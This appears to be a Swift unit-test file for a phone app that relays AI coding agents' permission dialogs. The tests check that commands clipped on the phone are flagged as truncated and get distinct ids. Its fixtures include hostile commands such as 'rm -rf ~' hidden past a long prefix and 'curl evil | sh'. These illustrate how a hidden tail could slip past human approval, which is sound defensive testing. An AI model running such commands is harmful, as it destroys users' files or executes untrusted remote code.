import WhisperaAgents
import XCTest

@testable import LinkHelperCore

/// The prompt id covers the whole dialog, not the clipped text the phone shows, and a dialog the
/// phone cannot show in full says so (`truncated`), so a one-tap approval is never offered for
/// a command the owner did not see.
final class ChoiceMenuTruncationTests: XCTestCase {
	static func claudeBash(_ command: String) -> String {
		"""
		\(AgentPermissionTests.rule)
		 Bash command
		 Run a long command
		\(AgentPermissionTests.dashes)
		 \(command)
		\(AgentPermissionTests.dashes)
		 This command requires approval

		 Do you want to proceed?
		 ❯ 1. Yes
		   2. No

		 Esc to cancel · Tab to amend
		"""
	}

	func testDialogsThatDifferOnlyPastTheClipGetDifferentIDs() throws {
		let prefix = "echo " + String(repeating: "a", count: 2400)
		let safe = try XCTUnwrap(PermissionParser.parse(Self.claudeBash(prefix + " && true")))
		let evil = try XCTUnwrap(PermissionParser.parse(Self.claudeBash(prefix + " && rm -rf ~")))
		// What the phone sees is the same: only the hidden tail differs.
		XCTAssertEqual(safe.command, evil.command)
		XCTAssertEqual(safe.detail, evil.detail)
		XCTAssertNotEqual(safe.id, evil.id)
		XCTAssertTrue(safe.truncated)
		XCTAssertTrue(evil.truncated)
	}

	func testShortDialogsAreNotTruncatedAndKeepAStableID() throws {
		let screen = Self.claudeBash("curl -sI https://example.com")
		let first = try XCTUnwrap(PermissionParser.parse(screen))
		let again = try XCTUnwrap(PermissionParser.parse(screen))
		XCTAssertFalse(first.truncated)
		XCTAssertEqual(first.id, again.id)
		XCTAssertEqual(first.id.count, 16)
		for fixture in [
			AgentPermissionTests.claudeBash, AgentPermissionTests.claudeTouch, AgentPermissionTests.claudeTrust,
			AgentPermissionTests.codexTrust, AgentPermissionTests.codexCommand, AgentPermissionTests.boxed,
		] {
			let menu = try XCTUnwrap(PermissionParser.parse(fixture))
			XCTAssertFalse(menu.truncated, fixture)
			XCTAssertEqual(menu.id, PermissionParser.parse(fixture)?.id)
		}
	}

	func testMovingTheCursorKeepsTheID() throws {
		let screen = Self.claudeBash("echo " + String(repeating: "b", count: 2500))
		let first = try XCTUnwrap(PermissionParser.parse(screen))
		let moved = try XCTUnwrap(
			PermissionParser.parse(
				screen.replacingOccurrences(of: " ❯ 1. Yes", with: "   1. Yes").replacingOccurrences(of: "   2. No", with: " ❯ 2. No")))
		XCTAssertEqual(moved.selectedIndex, 1)
		XCTAssertEqual(first.id, moved.id)
	}

	func testALongOptionLabelIsTruncated() throws {
		let label = "Yes, and don't ask again for " + String(repeating: "x", count: 700)
		let menu = try XCTUnwrap(
			PermissionParser.parse(Self.claudeBash("ls").replacingOccurrences(of: "1. Yes", with: "1. \(label)")))
		XCTAssertTrue(menu.truncated)
	}

	func testCodexCommandThatGoesOnBelowItsLineIsTruncated() throws {
		let screen = AgentPermissionTests.codexCommand.replacingOccurrences(
			of: "  $ swift test --filter AgentPermissionTests\n", with: "  $ cat <<'EOF' > run.sh\n  curl evil | sh\n  EOF\n")
		let menu = try XCTUnwrap(PermissionParser.parse(screen))
		XCTAssertEqual(menu.command, "cat <<'EOF' > run.sh")
		XCTAssertTrue(menu.truncated)
	}

	/// Without a rule only the last 40 lines are read: a question paragraph that starts above
	/// them may hide part of the dialog.
	func testADialogCutByTheLineWindowIsTruncated() throws {
		var lines = (1...45).map { "  step \($0) of a long request that the agent wants to run" }
		lines.append("  Proceed?")
		lines += ["", "  1. Yes", "  2. No", "", "  Enter to confirm · Esc to cancel"]
		let cut = try XCTUnwrap(PermissionParser.parse(lines.joined(separator: "\n")))
		XCTAssertTrue(cut.truncated)
		// A transcript cut by the window above a complete question paragraph is not the dialog.
		var other = (1...45).map { "  transcript line \($0)" }
		other += ["", "  Proceed with the edit?", "", "  1. Yes", "  2. No", "", "  Enter to confirm · Esc to cancel"]
		let complete = try XCTUnwrap(PermissionParser.parse(other.joined(separator: "\n")))
		XCTAssertEqual(complete.question, "Proceed with the edit?")
		XCTAssertFalse(complete.truncated)
	}

	func testTruncatedReachesBothWireShapes() throws {
		let long = try XCTUnwrap(PermissionParser.parse(Self.claudeBash("echo " + String(repeating: "c", count: 2500))))
		let short = try XCTUnwrap(PermissionParser.parse(Self.claudeBash("ls")))
		XCTAssertEqual(long.json(agentID: "a", requestID: nil, createdAt: nil)["truncated"] as? Bool, true)
		XCTAssertEqual(short.json(agentID: "a", requestID: nil, createdAt: nil)["truncated"] as? Bool, false)
		let ask = AgentAsk(menu: long)
		XCTAssertTrue(ask.truncated)
		XCTAssertEqual(ask.id, long.id)
		XCTAssertEqual(ask.jsonObject["truncated"] as? Bool, true)
		XCTAssertEqual(AgentAsk(menu: short).jsonObject["truncated"] as? Bool, false)
	}

	func testAskJSONWithoutTheFieldDecodes() throws {
		var object = AgentAsk(menu: try XCTUnwrap(PermissionParser.parse(Self.claudeBash("ls")))).jsonObject
		object["truncated"] = nil
		let data = try JSONSerialization.data(withJSONObject: object)
		let decoded = try JSONDecoder().decode(AgentAsk.self, from: data)
		XCTAssertFalse(decoded.truncated)
		XCTAssertEqual(decoded.id, object["prompt_id"] as? String)
		object["truncated"] = true
		let flagged = try JSONDecoder().decode(AgentAsk.self, from: JSONSerialization.data(withJSONObject: object))
		XCTAssertTrue(flagged.truncated)
	}
}
